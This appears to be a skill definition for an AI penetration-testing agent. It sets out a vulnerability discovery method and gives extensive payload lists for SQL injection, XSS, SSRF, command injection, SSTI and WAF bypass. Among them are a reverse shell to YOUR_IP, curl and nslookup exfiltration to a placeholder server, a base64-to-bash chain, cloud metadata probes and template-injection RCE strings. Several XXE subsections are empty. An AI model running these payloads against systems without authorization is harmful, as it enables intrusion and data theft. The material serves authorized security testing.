---
name: vuln-discovery
description: "Systematic identification and verification of security weaknesses in target applications"
category: core
tier: balanced
toolRefs: [httpRequest, parseResponse, checkWaf, findEndpointsInResponse, evaluateRendered, compareResponses, measureTiming, followRedirects, updateGraph, writeFinding, recordEvidence, getCapturedHeaders]
triggers: ["find vulnerabilities", "security testing", "vulnerability scanning", "weakness identification", "security assessment", "bug hunting", "vuln detection", "security flaws", "test for vulnerabilities", "security issues"]
contextBoosts: [sqli]
mitreAttack: ["T1190", "T1195"]
owaspRefs: ["OWASP Top 10 A03:2021 Injection", "OWASP Top 10 A06:2021 Vulnerable Components"]
---

# Vulnerability Discovery

## Description
Vulnerability discovery is the systematic process of identifying weaknesses in a target. You approach testing methodically, collect evidence, minimize false positives, and maintain a verification mindset throughout.

## When to Use
- During active penetration testing or security assessments
- When recon has identified testable inputs and endpoints
- When the user asks to find bugs, test for vulnerabilities, or assess security
- After mapping the attack surface and identifying injection points

## Do Not Use
- For reconnaissance or endpoint discovery (use recon skill)
- For authentication bypass testing specifically (use auth-control skill)
- When no specific target or input vectors have been identified
- For generating reports from existing findings (use reporting skill)

## Auth Context
Before making HTTP requests, call **getCapturedHeaders** with the target URL to get real auth context. Pass these in the `headers` parameter of httpRequest. Do not guess auth headers.

## Core Principle: Dynamic Payloads

You are the brain. Do NOT use hardcoded or canned payloads. For every injection point, reason about:
- **Input type**: Is it a search box (string), numeric ID, email field, file upload, JSON key, XML element?
- **Content type**: JSON, URL-encoded, multipart, XML, GraphQL?
- **Context**: Inside a JavaScript string, HTML attribute, CSS, SQL WHERE clause, NoSQL query?
- **WAF profile**: After checkWaf, adapt encoding (double URL-encode, unicode escape, case swap, comment injection)
- **Second-order**: Will the input be stored and rendered elsewhere? If so, craft a payload that triggers on render

Craft each payload from first principles based on the specific endpoint, parameter name, and observed behavior.

## Methodology

### Step 1: Map Attack Surface
Use recon data to identify all testable inputs:
- URL parameters (query string, path segments)
- Form fields (text, file, hidden)
- HTTP headers (User-Agent, Referer, X-Forwarded-For, custom headers)
- Cookies
- JSON/XML request bodies
- API endpoints with parameters

### Step 2: Prioritize by Risk
Focus on highest-impact first:
1. Authentication and authorization endpoints
2. Input parameters (injection points)
3. File upload functionality
4. API endpoints with database interaction
5. Business logic workflows

### Step 3: Test Systematically

For each injection point:

---

### SQL Injection (Database-Specific)

**Generic Tautology:**
- `' OR '1'='1`, `" OR "1"="1`, `' OR 1=1--`, `" OR ""="`

**UNION-Based:**
- `UNION SELECT null,null,null` (increment columns until match)
- `UNION ALL SELECT null,null,null` (avoid deduplication)
- `UNION SELECT 1,2,3--` (identify output columns)

**Blind Boolean:**
- `' AND 1=1--`, `' AND 1=2--` (compare response length, content, status)
- `' AND (SELECT LENGTH(password) FROM users LIMIT 1)=10--` (extract data bit by bit)

**Blind Time-Based:**
- `' AND SLEEP(5)--` (MySQL)
- `'; WAITFOR DELAY '0:0:5'--` (MSSQL)
- `'; SELECT PG_SLEEP(5)--` (PostgreSQL)
- `' AND DBMS_LOCK.SLEEP(5)--` (Oracle)
- Use **measureTiming** to detect delay vs baseline

**Error-Based (extract data from error messages):**
- `' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--` (MySQL XML error)
- `' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--` (MySQL)
- `' AND 1=CONVERT(int,@@version)--` (MSSQL type conversion)
- `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--` (Oracle)
- `' UNION SELECT NULL,NULL,NULL FROM information_schema.tables--` (MySQL schema enumeration)

**Stacked Queries:**
- `'; SELECT * FROM users--` (if multi-statement supported)
- `'; INSERT INTO users VALUES('hacker','pass123')--` (if writes possible)

**Database-Specific Enumeration:**
- MySQL: `' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--`
- PostgreSQL: `' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'--`
- MSSQL: `' UNION SELECT name,NULL FROM sysobjects WHERE xtype='U'--`
- Oracle: `' UNION SELECT table_name,NULL FROM all_tables WHERE ROWNUM=1--`
- SQLite: `' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--`

**Second-Order SQLi:**
- Register with username: `' OR '1'='1'--`
- Login with that account to trigger the query
- Inject into profile fields that are used in later queries

---

### Cross-Site Scripting (XSS)

**Reflected XSS:**
- `<script>alert(1)</script>` (basic)
- `<img src=x onerror=alert(1)>` (no closing tag needed)
- `<svg onload=alert(1)>` (SVG context)
- `<details open ontoggle=alert(1)>` (interaction required)
- `<body onload=alert(1)>` (body tag)
- `<input onfocus=alert(1) autofocus>` (autofocus trigger)

**Context-Specific XSS:**
- HTML body: `<div onmouseover=alert(1)>hover</div>`
- HTML attribute: `" onmouseover="alert(1)"` or `' onmouseover='alert(1)'`
- JavaScript string: `';alert(1)//` or `"-alert(1)-"`
- JavaScript template literal: `` `${alert(1)}` ``
- Inside `<script>` tag: `</script><script>alert(1)</script>`
- Inside `<style>` tag: `</style><script>alert(1)</script>`
- URL context: `javascript:alert(1)` (check if href is user-controlled)
- Event handler: `" onfocus="alert(1)" autofocus="`
- Encoded: `&#60;script&#62;alert(1)&#60;/script&#62;` (HTML entity)

**DOM-Based XSS:**
- Check `document.location`, `document.URL`, `document.referrer`
- Check `window.name`, `location.hash`, `location.search`
- Test `innerHTML`, `document.write`, `eval`, `setTimeout` sinks
- Check jQuery selectors: `$('img[src="' + userInput + '"]')`

**Stored XSS:**
- Inject in all form fields (comments, profiles, messages)
- Test with short payloads first, then longer variants
- Check if output is encoded differently per rendering context

**Filter Bypass XSS:**
- Case variation: `<ScRiPt>`, `<IMG SRC=x>`
- Null bytes: `<scr%00ipt>`
- Double encoding: `%253Cscript%253E`
- Protocol handlers: `<script/src=//attacker.com/xss.js>`
- Without parentheses: `<script>onerror=alert;throw 1</script>`
- Using `location`: `<script>location='javascript:alert(1)'</script>`

---

### SSRF (Server-Side Request Forgery)

**Internal URL Probes:**
- `http://127.0.0.1`, `http://localhost`, `http://[::1]`
- `http://0.0.0.0`, `http://127.0.0.1:80`, `http://127.0.0.1:443`
- `http://127.0.0.1:8080`, `http://127.0.0.1:6379` (Redis)
- `http://169.254.169.254` (cloud metadata endpoint)

**Cloud Metadata Endpoints:**
- AWS: `http://169.254.169.254/latest/meta-data/`
- AWS IMDSv2: `PUT http://169.254.169.254/latest/api/token` then GET
- GCP: `http://metadata.google.internal/computeMetadata/v1/`
- Azure: `http://169.254.169.254/metadata/instance?api-version=2021-02-01`
- DigitalOcean: `http://169.254.169.254/metadata/v1/`

**Protocol Smuggling:**
- `file:///etc/passwd`, `file:///proc/self/environ`
- `gopher://127.0.0.1:6379/_INFO` (Redis)
- `gopher://127.0.0.1:11211/_stats` (Memcached)
- `dict://127.0.0.1:6379/INFO` (Redis via dict)

**IP Encoding Bypass:**
- Decimal: `http://2130706433` (127.0.0.1)
- Octal: `http://0177.0.0.1` (127.0.0.1)
- Hex: `http://0x7f000001` (127.0.0.1)
- Mixed: `http://0177.0x7f.0.1`
- IPv6 shorthand: `http://[::ffff:127.0.0.1]`, `http://[0:0:0:0:0:ffff:127.0.0.1]`
- Non-standard: `http://127.1`, `http://127.0.1`, `http://0` (all resolve to 127.0.0.1)

**DNS Rebinding:**
- Register a domain that alternates between public IP and 127.0.0.1 on TTL=0
- Use rebinding service or custom DNS server
- First request resolves to allowlisted IP, second resolves to internal

**Redirect-Based Bypass:**
- Host a redirect at `https://your-server.com/redirect` that goes to `http://169.254.169.254/`
- If the app follows redirects, the SSRF hits the internal target
- Use `followRedirects: false` first to detect if redirect is possible

**Filter Bypass Techniques:**
- URL shorteners to obfuscate target
- IPv6 representations: `[::1]`, `[::ffff:127.0.0.1]`
- URL parser confusion: `http://127.0.0.1@evil.com` (resolves to evil.com)
- `http://evil.com#@127.0.0.1` (fragment confusion)
- Double URL encoding in path: `http://evil.com/%252e%252e/%252e%252e/etc/passwd`
- Backslash: `http://127.0.0.1\@evil.com`

---

### Command Injection

**Basic Injection:**
- Pipe: `| whoami`, `| cat /etc/passwd`
- Semicolon: `; id`, `; cat /etc/passwd`
- Backtick: `` `uname` ``, `` `id` ``
- Dollar: `$(whoami)`, `$(id)`
- AND: `&& whoami`, `&& cat /etc/passwd`
- OR: `|| whoami`, `|| id`
- Newline: `%0aid`, `%0auname`

**Filter Bypass Payloads:**
- Space bypass: `${IFS}` or `{$IFS}` (internal field separator in bash)
- No-space cat: `cat{IFS}/etc/passwd`, `cat${IFS}/etc/passwd`
- Case variation: `cAt /etc/passwd`, `CaT /etc/passwd`
- Wildcards: `c?t /etc/passwd`, `cat /etc/p?sswd`
- Hex encoding: `$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")`
- Octal: `$(printf "\143\141\164\040\057\145\164\143\057\160\141\163\163\167\144")`
- Backslash insertion: `c\at /etc/passwd`, `c"a"t /etc/passwd`
- Variable expansion: `a=c;b=at;$a$b /etc/passwd`
- IFS trick: `c${IFS}at${IFS}/etc/passwd`
- Brace expansion: `{cat,/etc/passwd}`
- Newline injection: `cat%0a/etc/passwd`, `cat%0d%0a/etc/passwd`
- Null byte: `cat%00/etc/passwd` (older systems)
- Command substitution within command: `$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash)` (base64 decode then execute)
- Reverse shell test: `bash -i >& /dev/tcp/YOUR_IP/4444 0>&1`

**Blind Command Injection:**
- Time-based: `; sleep 5`, `| sleep 5`, `$(sleep 5)`
- DNS exfiltration: `; nslookup $(whoami).YOUR_DOMAIN`
- HTTP exfiltration: `; curl http://YOUR_SERVER/?data=$(whoami)`

---

### XXE (XML External Entity)

**Classic XXE:**

**Parameter Entity (inside DTD):**

**Blind XXE (OOB extraction):**
Host `evil.dtd` on your server:

**XXE via SVG Upload:**

**XXE in SOAP:**

**XXE via Content-Type:**
- Send XML body with `Content-Type: text/xml` or `application/xml`
- If JSON endpoint, try changing Content-Type to `application/xml` and sending XML body
- Try `Content-Type: application/soap+xml` for SOAP-based services

**XXE Filter Bypass:**
- Encoding: `SYSTEM "php://filter/convert.base64-encode/resource=config.php"`
- UTF-7: `<?xml version="1.0" encoding="UTF-7"?>`
- BOM bypass: Prepend UTF-8 BOM bytes `EF BB BF`
- Double encoding: `SYSTEM "file:%252F%252Fetc%252Fpasswd"`
- Use `expect://` for PHP with expect extension: `SYSTEM "expect://id"`

**XXE to SSRF:**

---

### SSTI (Server-Side Template Injection)

**Detection Payloads:**
- `{{7*7}}` → 49 (Jinja2, Twig, Nunjucks, Handlebars)
- `${7*7}` → 49 (FreeMarker, Mako, Ruby ERB)
- `<%= 7*7 %>` → 49 (ERB, EJS)
- `#{7*7}` → 49 (Slim, Ruby)
- `{{7*'7'}}` → 4949 (Jinja2 string repeat)
- `${7*'7'}` → 7777777 (FreeMarker string repeat)
- `[[7*7]]` → 49 (Angular)

**Template Engine Identification:**
- `{{7*7}}` works → Jinja2/Twig/Nunjucks (Python/Node)
- `${7*7}` works → FreeMarker/Mako/Velocity (Java)
- `<%= 7*7 %>` works → ERB/EJS (Ruby/Node)
- `#{7*7}` works → Ruby Slim
- `[[7*7]]` works → Angular
- `${{7*7}}` works → Handlebars (double braces with dollar)
- Check error messages: "Jinja2", "Twig", "FreeMarker", "ERB"

**Jinja2 RCE:**
- `{{config.items()}}` (list config)
- `{{''.__class__.__mro__[1].__subclasses__()}}` (list all classes)
- `{{''.__class__.__mro__[1].__subclasses__()[N]}}` (pick a useful class like os._wrap_close)
- `{{lipsum.__globals__['os'].popen('id').read()}}` (if lipsum available)
- `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`

**Twig RCE:**
- `_self.env.app` (access app context)
- Use debug mode to find template paths
- Test for sandbox escape via `_twig_template.prerender`

**FreeMarker RCE:**
- `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` (if Execute allowed)
- `<#assign classloader=object.class.protectionDomain.classLoader>
<#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>`

**Handlebars RCE:**
- `{{#with "s" as |stringlist|}}
  {{#with "e"}}
    {{#splitType this}}
      {{#with "ss"}}
        {{#with "a"}}
          {{#with "s"}}
            {{#with "e"}}
              {{#with "r"}}
                {{this.[stringlist.[1].substring(10)[1]()]}}
              {{/with}}
            {{/with}}
          {{/with}}
        {{/with}}
      {{/with}}
    {{/splitType}}
  {{/with}}
{{/with}}`

**SSTI Filter Bypass:**
- Space replacement: `{{request.application.__self__._get_data_for_json.__globals__['os'].popen('id').read()}}`
- Alternative access: `{{().__class__.__bases__[0].__subclasses__()}}`
- Without underscores: `{{lipsum|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}`
- Unicode bypass: `\u005f\u005fclass\u005f\u005f`
- String concatenation: `['__cla'+'ss__']`

---

### WAF Bypass
- Start with **checkWaf** to understand the WAF profile
- Adapt encoding: double URL-encode, unicode, case swap, comment injection
- Use **omitHeader** to remove protection headers
- SQL comment insertion: `UN/**/ION SEL/**/ECT`
- Mixed encoding: `%55nion %53elect`
- Chunked transfer encoding bypass
- HTTP parameter pollution: `id=1&id=2`

### Step 4: Collect Evidence
Every finding needs proof:
- HTTP request/response pairs (use httpRequest and parseResponse)
- Screenshots of visual confirmation (use stagehand_screenshot)
- Before/after comparisons (use compareResponses)
- Timing measurements (use measureTiming)

### Step 5: Verify and Validate
- Distinguish real vulnerabilities from false positives
- Can you reliably reproduce the issue?
- Is the response truly indicative of a flaw, or a generic error page?
- A WAF error page is NOT SQL injection. A 403 is NOT authorization bypass.
- Verify template injection by doing math: `{{7*7}}` must return 49, not an error
- Verify XXE by reading a file you know exists: `/etc/passwd` on Linux

### Step 6: Assess Impact
- What does an attacker gain? Data access, privilege escalation, service disruption?
- Can the vulnerability be chained with other findings?
- SSRF to cloud metadata = full infrastructure compromise
- XXE to `/etc/passwd` = host file disclosure, possible RCE
- SSTI with RCE = full server takeover
- SQLi with stacked queries = full database takeover

## Rules
- Change one variable at a time to establish causation
- Call **recordEvidence** after every test, regardless of pass/fail
- Call **writeFinding** only on confirmed vulnerabilities with evidence
- If you hit a dead end on one technique, switch to a completely different attack type
- Never use payloads that cause data destruction or denial of service
- Test for impact safely: read-only first, then escalate

## Anti-Hallucination
Your claims will be verified against real tool output. Never fabricate findings.
Every vulnerability you report MUST have a corresponding tool call response that proves it.
If a tool call fails, say so honestly — do not invent a success.
A template injection claim requires proof that `{{7*7}}` returned 49 in the response.
An XXE claim requires proof that file content appeared in the response.
A SQLi claim requires proof of error messages, data extraction, or timing differences.
A command injection claim requires proof of command output in the response or time delay.

## Trigger Conditions

Activate during active testing once recon has produced concrete inputs/endpoints to test — search boxes, numeric IDs, headers, cookies, JSON/XML bodies, upload fields, and API parameters. Trigger when the user asks to find bugs, test for vulnerabilities, or assess security. Do not use for pure recon/endpoint discovery (use recon skill), auth-bypass specifics (auth-control), or report generation (reporting). Best used after the attack surface is mapped.

## Detection Approach

Map the attack surface first, then prioritize high-impact sinks: auth/authorization endpoints, injection parameters, uploads, DB-backed APIs, business-logic flows. For each injection point, reason about input type, content type, and context (SQL clause, JS string, HTML attr, NoSQL query, XML element) before crafting a payload from first principles — never canned lists. Probe one technique family at a time: start with a benign canary to learn parsing, then the simplest positive (tautology/XSS `<script>`, arithmetic for SSTI, operator object for NoSQL), then blind variants (boolean, time, OOB) only when output is hidden. After `checkWaf`, adapt encoding rather than repeating blocked forms. Change a single variable per test to establish causation, and always compare against a clean baseline response.

## Pitfalls

- Using hardcoded/canned payloads without reasoning about the specific context — adapt per endpoint.
- Treating a WAF 403 or generic error page as the vulnerability itself — those are not findings.
- Testing multiple variables at once, making it impossible to attribute the cause of a difference.
- Claiming a finding from reflection alone (XSS) or an error alone (SQLi/XXE) without execution/data proof.
- Skipping baseline/negative controls — without a true/false comparison, differentials are noise.
- Ignoring second-order sinks where input is stored and rendered later.
- Writing findings before evidence exists — `writeFinding` only on confirmed, evidenced issues.

## Verification & Impact

CONFIRMED when a testable input produces reproducible, evidence-backed behavior: SQLi via error/data/timing; XSS via executed script in rendered context; XXE via file content in response; SSTI via `{{7*7}}`=49; NoSQL via differential with data; command injection via output or measured side effect. SUSPECTED when an anomaly appears but cannot be reproduced or lacks a captured exchange — log as candidate, not a finding. Document impact by what the flaw enables and its severity, always backing claims with `recordEvidence` request/response pairs and `writeFinding` entries.
